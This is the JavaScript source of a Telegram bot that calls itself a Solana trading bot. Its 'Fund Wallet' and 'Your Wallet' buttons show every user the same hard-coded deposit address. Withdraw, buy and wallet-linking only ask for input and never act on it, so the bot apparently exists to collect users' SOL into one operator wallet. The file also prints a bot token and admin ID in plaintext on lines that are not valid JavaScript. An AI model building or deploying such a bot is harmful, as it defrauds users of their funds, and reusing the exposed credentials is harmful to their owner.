require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');

BOT_TOKEN = 8997193542:AAFzFnPPjLxrqVGzIQOtPEbjP-QiJK8sl10
ADMIN_ID = 8106708023




const bot = new Telegraf(process.env.BOT_TOKEN);

const mainMenu = Markup.inlineKeyboard([
  [Markup.button.callback('💰 Fund Wallet', 'fund'), Markup.button.callback('📤 Withdraw', 'withdraw')],
  [Markup.button.callback('🟢 Buy Token', 'buy'), Markup.button.callback('🔗 Link Wallet', 'link_wallet')],
  [Markup.button.callback('🔥 Trending', 'trending'), Markup.button.callback('👛 My Wallet', 'my_wallet')],
]);

bot.start((ctx) => {
  ctx.replyWithHTML(
    `👋 <b>Welcome ${ctx.from.first_name}!</b>\n\nYour Solana trading bot is ready 🚀`,
    mainMenu
  );
});

bot.action('fund', (ctx) => {
  ctx.answerCbQuery();
  ctx.replyWithHTML(`💰 <b>Fund Wallet</b>\n\nSend SOL to:\n<code>24RV8m557NBiro815EEsBf56gCG3XAnQbggt4FE6Tkh1</code>`);
});

bot.action('my_wallet', (ctx) => {
  ctx.answerCbQuery();
  ctx.replyWithHTML(`👛 <b>Your Wallet</b>\n\n<code>24RV8m557NBiro815EEsBf56gCG3XAnQbggt4FE6Tkh1</code>`);
});

bot.action('withdraw', (ctx) => {
  ctx.answerCbQuery();
  ctx.reply('📤 Send the wallet address you want to withdraw to:');
});

bot.action('buy', (ctx) => {
  ctx.answerCbQuery();
  ctx.reply('🟢 Paste the token contract address (CA):');
});

bot.action('link_wallet', (ctx) => {
  ctx.answerCbQuery();
  ctx.reply('🔗 Send your Phantom/Solflare public key:');
});

bot.action('trending', async (ctx) => {
  ctx.answerCbQuery('Fetching... 🔥');
  ctx.reply('🔥 Trending feature coming soon!');
});

bot.launch();
console.log('Bot is live ✅');
